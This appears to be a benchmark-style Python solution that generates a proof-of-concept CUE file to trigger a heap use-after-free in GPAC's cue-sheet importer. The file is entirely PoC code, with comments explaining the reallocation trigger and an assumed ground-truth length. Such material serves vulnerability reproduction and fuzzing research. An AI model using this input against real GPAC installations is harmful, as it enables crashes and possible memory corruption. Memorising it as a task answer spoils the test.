import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability described matches OSS-Fuzz issue 61292 (GPAC: Heap-use-after-free in gf_cues_import).
        # The UAF occurs when adding seekpoints (INDEX entries) causes the internal array to reallocate,
        # while a pointer to an element in the old allocation is potentially still in use or the logic 
        # mishandles the updated pointer.
        #
        # Ground-truth length of 159 bytes suggests the file structure:
        # FILE "poc" BINARY (18 bytes)
        # TRACK 01 AUDIO (15 bytes)
        # 7 x INDEX 01 00:00:00 (7 * 18 = 126 bytes)
        # Total = 159 bytes.
        #
        # To robustly trigger the reallocation (which typically happens at power-of-2 boundaries like 4, 8, 16),
        # we will provide enough INDEX entries to exceed the likely initial capacity (e.g. 8).
        
        poc = b'FILE "A" BINARY\n'
        poc += b'TRACK 01 AUDIO\n'
        
        # Add 12 indices to ensure we cross boundaries like 4 and 8.
        for i in range(1, 13):
            # INDEX <number> <mm:ss:ff>
            poc += f'INDEX {i:02d} 00:00:{i:02d}\n'.encode('utf-8')
            
        return poc